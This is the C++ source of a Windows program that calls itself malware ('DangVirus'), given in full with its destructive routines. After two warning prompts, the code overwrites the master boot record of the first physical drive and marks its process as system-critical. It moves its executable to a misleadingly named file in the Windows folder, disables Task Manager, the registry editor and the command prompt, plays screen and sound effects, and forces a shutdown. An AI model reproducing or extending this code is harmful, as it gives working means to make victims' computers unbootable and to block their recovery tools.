// DangVirus.cpp : Defines the entry point for the application.
//

#include "DangVirus.h"
#include "gdipayloader.h"
#include "soundskull.h"
#include "deppmbr.h"

DWORD WINAPI mbr(LPVOID lpParam) {
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);
	WriteFile(hDevice, MasterBootRecord, 32768, &dwBytesWritten, 0);
	return 1;
}

DWORD WINAPI moveself(LPVOID lpParam) {
	char pathdel[MAX_PATH];
	GetModuleFileNameA(NULL, pathdel, MAX_PATH);
	MoveFileA(pathdel, "C:\\Windows\\NotAntiVirus.exe");
	return 1;
}

typedef VOID(_stdcall* RtlSetProcessIsCritical) (
	IN BOOLEAN        NewValue,
	OUT PBOOLEAN OldValue,
	IN BOOLEAN     IsWinlogon);

BOOL EnablePriv(LPCWSTR lpszPriv) //enable Privilege
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkprivs;
	ZeroMemory(&tkprivs, sizeof(tkprivs));

	if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
		return FALSE;

	if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
		CloseHandle(hToken); return FALSE;
	}

	tkprivs.PrivilegeCount = 1;
	tkprivs.Privileges[0].Luid = luid;
	tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
	CloseHandle(hToken);
	return bRet;
}

BOOL ProcessIsCritical()
{
	HANDLE hDLL;
	RtlSetProcessIsCritical fSetCritical;

	hDLL = LoadLibraryA("ntdll.dll");
	if (hDLL != NULL)
	{
		EnablePriv(SE_DEBUG_NAME);
		(fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
		if (!fSetCritical) return 0;
		fSetCritical(1, 0, 0);
		return 1;
	}
	else
		return 0;
}


DWORD WINAPI shutdowns(LPVOID lpParam) {
	typedef ULONG32(WINAPI* lpNtShutdownSystem)(int Action);
	typedef ULONG32(WINAPI* lpNtSetSystemPowerState)(IN POWER_ACTION SystemAction, IN SYSTEM_POWER_STATE MinSystemState, IN ULONG32 Flags);
	HANDLE hToken;
	TOKEN_PRIVILEGES tkp;
	PVOID Info;
	HMODULE hModule;
	lpNtSetSystemPowerState NtSetSystemPowerState;
	lpNtShutdownSystem NtShutdownSystem;

	//Load ntdll.dll
	if ((hModule = LoadLibrary(_T("ntdll.dll"))) == 0) {
		return 1;
	}

	//Get functions
	NtShutdownSystem = (lpNtShutdownSystem)GetProcAddress(hModule, "NtShutdownSystem");
	if (NtShutdownSystem == NULL) {
		return 2;
	}
	NtSetSystemPowerState = (lpNtSetSystemPowerState)GetProcAddress(hModule, "NtSetSystemPowerState");
	if (NtSetSystemPowerState == NULL) {
		return 3;
	}

	// Get a token for this process
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		return(FALSE);

	// Get the LUID for the shutdown privilege
	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
	tkp.PrivilegeCount = 1;  // one privilege to set	
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	// Get the shutdown privilege for this process. 
	AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
	if (GetLastError() != ERROR_SUCCESS) {
		return 4;
	}

	/*
	* Technically only NtSetSystemPowerState is needed to be called to power off a computer
	* Howver, I found at least one report of NtSetSystemPowerState not working while NtShutdownSystem does
	* https://www.autoitscript.com/forum/topic/149641-how-to-force-a-power-down/page/2/?tab=comments#comment-1166299
	* So the code calls NtSetSystemPowerState first, since in my tests it's a hair faster, and if that fails will call NtShutdownSystem as a fallback
	*/
	ULONG32 retNSSPS = NtSetSystemPowerState((POWER_ACTION)PowerSystemShutdown, (SYSTEM_POWER_STATE)PowerActionShutdown, 0);
	ULONG32 retNSS = NtShutdownSystem(2); //2 = ShutdownPowerOff
	return 1;
}

void RegAdd(HKEY HKey, LPCWSTR Subkey, LPCWSTR ValueName, unsigned long Type, unsigned int Value) { //credits to Mist0090, cuz creating registry keys in C++ without shitty system() or reg.exe is hell
	HKEY hKey;
	DWORD dwDisposition;
	LONG result;
	result = RegCreateKeyExW(HKey, Subkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition);
	result = RegSetValueExW(hKey, ValueName, 0, Type, (const unsigned char*)&Value, (int)sizeof(Value));
	RegCloseKey(hKey);
	return;
}
int WINAPI WinMain(HINSTANCE hia,
	HINSTANCE his,
	LPSTR hiu,
	int hap) {
	CreateThread(0, 0, moveself, 0, 0, 0);
	if (MessageBoxW(NULL, L"warning \n this is a malware, do you run this?, are you sure to run dangerous malware, you will unstable boot device, do you run during a malware, for an test malware? \n are you sure?", L"DangVirus.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
		ExitProcess(0);
	}
	else {
		if (MessageBoxW(NULL, L"!!!Last Warning!!! \nAre You Sure? \n you will destroy pc!", L"DangVirus.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
			ExitProcess(0);
		}
		else {
			ProcessIsCritical();
			CreateThread(0, 0, mbr, 0, 0, 0);
			RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableTaskMgr", REG_DWORD, 1);
			RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableRegistryTools", REG_DWORD, 1);
			RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", L"DisableCMD", REG_DWORD, 2);
			Sleep(5000);
			HANDLE gdi1 = CreateThread(0, 0, shader::gdi, 0, 0, 0);
			sound1();
			Sleep(30000);
			TerminateThread(gdi1, 0);
			CloseHandle(gdi1);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE gdi2 = CreateThread(0, 0, shader2::gdi, 0, 0, 0);
			sound2();
			Sleep(30000);
			TerminateThread(gdi2, 0);
			CloseHandle(gdi2);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE gdi3 = CreateThread(0, 0, shader3::gdi, 0, 0, 0);
			sound3();
			Sleep(30000);
			TerminateThread(gdi3, 0);
			CloseHandle(gdi3);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE gdi4 = CreateThread(0, 0, shader4::gdi, 0, 0, 0);
			sound4();
			Sleep(30000);
			TerminateThread(gdi4, 0);
			CloseHandle(gdi4);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE gdi5 = CreateThread(0, 0, shader5::gdi, 0, 0, 0);
			sound5();
			Sleep(30000);
			TerminateThread(gdi5, 0);
			CloseHandle(gdi5);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE gdi6 = CreateThread(0, 0, lastshader::gdi, 0, 0, 0);
			sound6();
			Sleep(30000);
			TerminateThread(gdi6, 0);
			CloseHandle(gdi6);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			CreateThread(0, 0, shutdowns, 0, 0, 0);
			Sleep(-1);
		}
	}
}